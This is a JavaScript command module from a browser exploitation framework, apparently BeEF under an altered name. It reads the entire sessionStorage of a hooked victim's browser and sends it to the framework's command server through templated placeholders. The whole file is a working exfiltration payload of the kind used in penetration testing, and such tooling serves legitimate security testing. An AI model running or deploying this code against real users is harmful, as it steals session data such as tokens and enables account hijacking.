//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
	if ('sessionStorage' in window && window['sessionStorage'] !== null) {
		server.net.send("<%= @command_url %>", <%= @command_id %>, "sessionStorage="+JSON.stringify(window['sessionStorage']));
	} else server.net.send("<%= @command_url %>", <%= @command_id %>, "sessionStorage="+JSON.stringify("HTML5 sessionStorage is null or not supported."));
});
